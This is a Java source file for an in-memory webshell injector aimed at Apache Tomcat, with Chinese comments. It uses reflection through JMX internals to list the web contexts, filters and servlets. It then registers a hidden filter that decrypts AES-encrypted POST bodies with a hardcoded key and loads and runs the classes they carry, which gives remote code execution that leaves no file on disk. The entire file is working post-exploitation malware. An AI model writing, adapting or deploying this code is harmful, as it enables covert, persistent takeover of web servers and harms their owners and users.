import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.MBeanServer;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.JspFactory;
import javax.servlet.jsp.PageContext;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;

public class TomcatContextManager extends ClassLoader implements Filter, Servlet, ServletConfig {
    //为空，枚举出所有namingContextName;指定namingContextName，列出所有filters和servlets
    public static String SCName = "";
    //不为空，则在上面的context下注入filtershell
    public static String urlPatern = "";
    private ServletRequest Request;
    private ServletResponse Response;
    private ServletContext servletContext;
    private HttpSession Session;
    private FilterConfig filterConfig;


    public boolean equals(Object object) {
        PageContext page = (PageContext)object;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        this.Response.setCharacterEncoding("UTF-8");
        StringBuilder results = new StringBuilder();

        try {
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap obj2 = (HashMap)field.get(obj);
            obj = ((HashMap)obj2.get("Catalina")).get("type=Mapper");

            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("org.apache.catalina.mapper.MapperListener").getDeclaredField("mapper");
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("org.apache.catalina.mapper.Mapper").getDeclaredField("contextObjectToContextVersionMap");
            modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            field.setAccessible(true);
            Map contextObjectToContextVersionMap = (Map) field.get(obj);

            Object[] objects = contextObjectToContextVersionMap.keySet().toArray();
            for ( Object o: objects) {
                StandardContext standardContext = (StandardContext) o;
                Field namingContextName = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("namingContextName");
                namingContextName.setAccessible(true);
                String s = (String) namingContextName.get(standardContext);
                if (SCName.equals("")) {
                    results.append(s + "\n");
                } else if (s.equals(SCName)) {
                    //注入内存shell
                    if (!urlPatern.equals("")) {
                        String filterName = "filter"+System.currentTimeMillis();

                        Field stateField = Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
                        stateField.setAccessible(true);
                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
                        javax.servlet.FilterRegistration.Dynamic filterRegistration = standardContext.getServletContext().addFilter(filterName, this);
                        filterRegistration.setInitParameter("encoding", "utf-8");
                        filterRegistration.setAsyncSupported(false);
                        filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, urlPatern);

                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);

                        Method filterStartMethod = standardContext.getClass().getMethod("filterStart");
                        filterStartMethod.invoke(standardContext, null);
                    }
                    results.append("getFilters:\n");
                    Object[] filterMaps = standardContext.findFilterMaps();
                    for (Object fm: filterMaps) {
                        Method method = fm.getClass().getMethod("getFilterName");
                        String filterName = (String) method.invoke(fm);

                        method = fm.getClass().getMethod("getURLPatterns");
                        String[] urlPattern = (String[]) method.invoke(fm);

                        results.append("FilterName:"+filterName+" --> "+ Arrays.toString(urlPattern) + "\n");
                    }
                    results.append("\n");

                    results.append("getServlets:\n");
                    field = standardContext.getClass().getDeclaredField("servletMappings");
                    field.setAccessible(true);
                    HashMap<String, String> maps = (HashMap<String, String>) field.get(standardContext);
                    for (Map.Entry<String, String> entry: maps.entrySet()) {
                        String servletName = entry.getKey();
                        String urlPattern = entry.getValue();

                        results.append("servletName: " + servletName + " --> " + urlPattern + "\n");
                    }
                }
            }
        } catch (Exception var6) {
            results.append(var6.toString());
        }

        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(results.toString().getBytes(StandardCharsets.UTF_8));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception var5) {
            var5.printStackTrace();
        }

        return true;
    }

    public TomcatContextManager() {}
    public TomcatContextManager(ClassLoader c){
        super(c);
    }

    public Class g(byte []b){
        return super.defineClass(b, 0, b.length);
    }

    public void init(FilterConfig Config) throws ServletException {
        this.filterConfig = Config;
    }

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        if (req.getMethod().equals("POST")){
            String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
            req.getSession().putValue("u",k);
            try {
                Cipher c=Cipher.getInstance("AES");
                c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
                PageContext pageContext = JspFactory.getDefaultFactory().getPageContext(this, request, response, null, true, 8192, true);
                new TomcatContextManager(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
            } catch (Exception e) {

            }
        } else {
            filterChain.doFilter(request, response);
        }
    }

    public void init(ServletConfig servletConfig) throws ServletException {
    }

    public ServletConfig getServletConfig() {
        return this;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
    }

    public String getServletInfo() {
        return this.getServletName();
    }

    public void destroy() {
    }

    @Override
    public String getServletName() {
        return "Servlet";
    }

    @Override
    public ServletContext getServletContext() {
        return this.filterConfig.getServletContext();
    }

    @Override
    public String getInitParameter(String s) {
        return s;
    }

    @Override
    public Enumeration<String> getInitParameterNames() {
        return null;
    }
}